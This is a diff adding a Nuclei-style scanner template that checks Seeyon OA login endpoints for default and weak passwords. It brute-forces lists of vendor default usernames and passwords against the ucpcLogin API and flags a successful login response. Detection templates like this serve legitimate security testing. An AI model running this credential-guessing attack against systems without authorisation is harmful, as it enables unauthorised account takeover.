@@ -1,0 +1,46 @@
+id: seeyon-oa-default-login
+
+info:
+  name: 致远OA默认口令检测（ucpcLogin接口）
+  author: seeyon
+  severity: high
+  tags: seeyon
+
+http:
+  - raw:
+      - |
+        POST /seeyon/rest/authentication/ucpcLogin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+        Referer: {{BaseURL}}/seeyon/
+
+        UserAgentFrom=iphone&login_username={{username}}&login_password={{password}}
+
+    attack: clusterbomb
+    payloads:
+      username:
+        - "admin"       # 常见管理员账号
+        - "system"      # 系统账号
+        - "seeyon"      # 厂商默认账号
+        - "audit"       # 审计账号
+        - "user"        # 普通用户账号
+        - "audit-admin"
+        - "group-admin"
+        - "admin1"
+      password:
+        - "seeyon123456"
+        - "1"           # 部分版本默认密码
+        - "123"         # 常见弱口令
+        - "123456"      # 常见弱口令
+        - "admin"       # 与用户名相同
+        - "seeyon"      # 厂商默认密码
+        - "system"      # 与用户名相同
+        - "password"    # 常见弱口令
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "\"LoginOK\":\"ok\"")'  # 登录成功的JSON响应特征
+        condition: and
